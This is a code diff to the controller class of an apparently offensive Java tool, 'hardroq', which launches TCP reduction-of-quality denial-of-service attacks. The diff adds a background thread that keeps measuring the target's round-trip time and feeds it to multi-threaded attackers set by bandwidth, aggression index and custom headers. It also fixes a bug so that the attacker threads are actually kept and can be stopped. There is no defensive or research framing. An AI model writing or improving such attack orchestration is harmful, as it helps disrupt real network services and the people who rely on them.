@@ -1,9 +1,9 @@
 package hardroq.controllers;
 
-import java.io.IOException;
-
 import hardroq.networking.Ping;
 import hardroq.networking.TCPRoQ;
+
+import java.io.IOException;
 
 public class AttackController {
 	//Singleton Crap
@@ -18,35 +18,70 @@ public class AttackController {
 	private TCPRoQ[] attackers;
 	private String host;
 	private int port;
-	private int RTT;
+	private int RTT = 0;
 	private String attackHeader = "";
 	private String attackFooter = "";
 	private float aggressionIndex;
 	private float bandwidth;
 	private int numThreads;
+	private Thread pingThread = new Thread();
+	private boolean attacking = false;
 	
 	public void Attack() {
-		//First, let's get a round trip time to initiate our attack vectors
-		try {
-			RTT = Ping.HTTPPing(host, port);
-		} catch (IOException e) {
-			System.out.println(e.getMessage());
-		}
+		//First, let's start the RTT Pinger to initialize the attack vectors
+		attacking  = true;
+		startPinging();
+		
+		while (RTT == 0)
+			try {
+				Thread.sleep(10);
+			} catch (InterruptedException e) {
+				System.out.println(e.getMessage());
+			}
 		
 		attackers = new TCPRoQ[numThreads];
-		for (TCPRoQ a : attackers) {
-			a = new TCPRoQ.Builder().host(host).port(port)
+		for (int i = numThreads; --i >= 0;) {
+			final TCPRoQ a = new TCPRoQ.Builder().host(host).port(port)
 					.bandwidth(bandwidth / numThreads).header(attackHeader)
 					.footer(attackFooter).aggression(aggressionIndex)
 					.RTT(RTT).build();
 			a.InitiateAttack();
-		}
+			attackers[i] = a;
+		}		
 	}
 	
 	public void EndAttack() {
-		for (TCPRoQ a : attackers)
-			a.EndAttack();
+		if (attacking) {
+			for (TCPRoQ a : attackers)
+				a.EndAttack();
+		
+			attacking = false;
+		}
 	}
+
+	private void startPinging() {
+		if (!pingThread.isAlive()) {
+			pingThread = new Thread(pinger, "Ping Thread");
+			pingThread.start();
+		}
+	}
+
+	private Runnable pinger = new Runnable() {
+		@Override
+		public void run() {
+			while (attacking) {
+				try {
+					RTT = Ping.HTTPPing(host, port);
+					Thread.sleep(2000);
+				} catch (Exception e) {
+					System.out.println(e.getMessage());
+				}
+				
+				TCPRoQ.setRTT(RTT);
+			}
+		}
+	};
+	
 	
 	public void setAttackHeader(final String h) {
 		attackHeader = h;
